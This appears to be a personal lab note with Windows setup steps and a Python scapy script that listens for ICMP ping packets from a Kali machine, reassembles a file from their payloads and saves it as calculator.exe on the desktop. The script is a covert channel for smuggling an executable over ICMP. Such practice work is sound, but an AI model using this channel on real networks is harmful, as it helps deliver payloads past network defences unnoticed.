#window10:

#powershell:
pip install scapy

on desktop:
receiver.py
#!/usr/bin/env python3
from scapy.all import *
import os

output_path = os.path.expanduser("~/Desktop/calculator.exe")
file_data = bytearray()
expected_size = 0
receiving = False

def handle_packet(pkt):
    global file_data, expected_size, receiving
    
    if ICMP in pkt and pkt[ICMP].type == 8:  # Echo Request
        icmp_id = pkt[ICMP].id
        payload = bytes(pkt[ICMP].payload)
        
        if icmp_id == 1234:
            filename = payload.decode().strip('\x00')
            print(f"[+] Filename: {filename}")
            
        elif icmp_id == 1235:
            expected_size = int(payload.decode().strip('\x00'))
            print(f"[+] Expected size: {expected_size} bytes")
            receiving = True
            
        elif icmp_id == 1236 and receiving:
            file_data.extend(payload)
            print(f"    Progress: {len(file_data)}/{expected_size} bytes", end='\r')
            
        elif icmp_id == 1237:
            print(f"\n[+] Transfer complete!")
            with open(output_path, 'wb') as f:
                f.write(file_data)
            print(f"[+] Saved to: {output_path}")
            print(f"[+] File size: {len(file_data)} bytes")
            return True  # Signal to stop

print("[+] Starting ICMP listener...")
print("[+] Waiting for packets from Kali...")

# Sniff for ICMP packets
sniff(filter="icmp", prn=handle_packet, stop_filter=lambda x: handle_packet(x) if ICMP in x and x[ICMP].id == 1237 else False)

run it in powershell:
cd $HOME\Desktop
python "C:\Users\Noor Ul Haq\Desktop\receiver.py"